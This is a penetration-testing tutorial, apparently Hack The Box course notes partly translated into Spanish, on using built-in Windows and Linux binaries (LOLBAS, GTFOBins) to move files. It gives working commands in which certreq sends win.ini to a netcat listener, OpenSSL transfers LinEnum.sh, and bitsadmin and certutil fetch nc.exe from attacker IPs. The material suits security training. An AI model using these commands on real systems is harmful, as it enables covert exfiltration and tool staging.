La frase "Vivir de la tierra" fue acuñada por Christopher Campbell [@obscuresec](https://twitter.com/obscuresec) y Matt Graeber [@mattifestation](https://twitter.com/mattifestation) en [DerbyCon 3](https://www.youtube.com/watch?v=j-r6UonEkUw) . El término LOLBins (Living off the Land binarios) surgió de una discusión en Twitter sobre cómo llamar a los binarios que un atacante puede usar para realizar acciones más allá de su propósito original. Actualmente hay dos sitios web que agregan información sobre los binarios de Living off the Land:

- [Proyecto LOLBAS para binarios de Windows](https://lolbas-project.github.io)
- [GTFOBins para binarios de Linux](https://gtfobins.github.io/)

Los binarios de Living off the Land se pueden utilizar para realizar funciones tales como:
- Descargar
- Subir
- Ejecución de comandos
- Lectura de archivos
- Escritura de archivo
- Bypasses

## Usando el Proyecto LOLBAS y GTFOBins
[LOLBAS para Windows](https://lolbas-project.github.io/#) y [GTFOBins para Linux](https://gtfobins.github.io/) son sitios web donde podemos buscar binarios que podemos utilizar para diferentes funciones.

### LOLBÁS
Para buscar funciones de descarga y carga en [LOLBAS](https://lolbas-project.github.io/) podemos usar `/download` o `/upload`. Usemos [CertReq.exe](https://lolbas-project.github.io/lolbas/Binaries/Certreq/) como ejemplo.
Necesitamos escuchar en un puerto de nuestro host de ataque el tráfico entrante usando Netcat y luego ejecutar certreq.exe para cargar un archivo.

```js
C:\htb> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)
```
#### Archivo recibido en nuestra sesión de Netcat
```js
p314d0@htb[/htb]$ sudo nc -lvnp 8000

listening on [any] 8000 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.1] 53819
POST / HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: application/json
User-Agent: Mozilla/4.0 (compatible; Win32; NDES client 10.0.19041.1466/vb_release_svc_prod1)
Content-Length: 92
Host: 192.168.49.128:8000

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

Si recibe un error al ejecutar `certreq.exe`, es posible que la versión que estás utilizando no contenga el `-Post`parámetro. Puede descargar una versión actualizada [aquí](https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe) e intentarlo nuevamente.

### GTFOBins
Para buscar la función de descarga y carga en [GTFOBins para binarios de Linux](https://gtfobins.github.io/) , podemos usar `+file download` o `+file upload`.

Usemos [OpenSSL](https://www.openssl.org/) . Se instala con frecuencia y a menudo se incluye en otras distribuciones de software, y los administradores de sistemas lo utilizan para generar certificados de seguridad, entre otras tareas. OpenSSL se puede utilizar para enviar archivos "estilo nc". Necesitamos crear un certificado e iniciar un servidor en nuestro Pwnbox.

#### Crear Certificado
```js
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```

#### Poner en marcha el Servidor en nuestro Pwnbox
```js
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

A continuación, con el servidor en ejecución, debemos descargar el archivo de la máquina comprometida.
#### Descargar archivo de la máquina comprometida
```js
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

## Other Common Living off the Land tools
### Bitsadmin Download function
The [Background Intelligent Transfer Service (BITS)](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal) can be used to download files from HTTP sites and SMB shares. It "intelligently" checks host and network utilization into account to minimize the impact on a user's foreground work.

#### File Download with Bitsadmin
```powershell
PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

#### Download
```powershell
PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

### Certutil
```js
C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```


